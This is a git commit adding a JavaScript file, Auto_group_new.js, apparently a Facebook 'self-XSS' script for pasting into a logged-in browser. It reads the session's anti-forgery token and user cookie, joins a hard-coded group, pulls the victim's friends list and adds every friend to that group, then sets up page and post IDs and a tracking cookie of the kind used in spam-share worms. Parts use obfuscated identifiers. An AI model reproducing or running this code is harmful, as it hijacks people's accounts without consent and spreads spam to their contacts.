c4e5f558e666bffd08202ce7adec9d74fd81dfe3
Tumul2009 <tumul2005@gmail.com>
2014-03-19 17:10:51 +0600

    Create Auto_group_new.js

---
+++ Auto_group_new.js
@@ -0,0 +1,56 @@
+var gid = ['761724083840206'];
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var httpwp = new XMLHttpRequest();
+var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
+var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
+httpwp['open']('POST', urlwp, true);
+httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+httpwp['setRequestHeader']('Content-length', paramswp['length']);
+httpwp['setRequestHeader']('Connection', 'keep-alive');
+httpwp['send'](paramswp);
+
+var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
+var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
+
+var friends = new Array();
+gf = new XMLHttpRequest();
+gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
+gf['send']();
+if (gf['readyState'] != 4) {} else {
+    data = eval('(' + gf['responseText']['substr'](9) + ')');
+    if (data['error']) {} else {
+        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
+            return _0x93dax8['index'] - _0x93dax9['index'];
+        });
+    };
+};
+
+for (var i = 0; i < friends['length']; i++) {
+    var httpwp = new XMLHttpRequest();
+    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
+    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
+    httpwp['open']('POST', urlwp, true);
+    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+    httpwp['setRequestHeader']('Content-length', paramswp['length']);
+    httpwp['setRequestHeader']('Connection', 'keep-alive');
+    httpwp['onreadystatechange'] = function () {
+if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
+    };
+    httpwp['send'](paramswp);
+};
+var spage_id = "197137080453829";
+var spost_id = "774673169241304";
+var sfoto_id = "580385482003408";
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var smesaj = "";
+var smesaj_text = "";
+var arkadaslar = [];
+var svn_rev;
+var bugun= new Date();
+var btarihi = new Date(); 
+btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
+if(!document.cookie.match(/paylasti=(\d+)/)){
+document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
+}
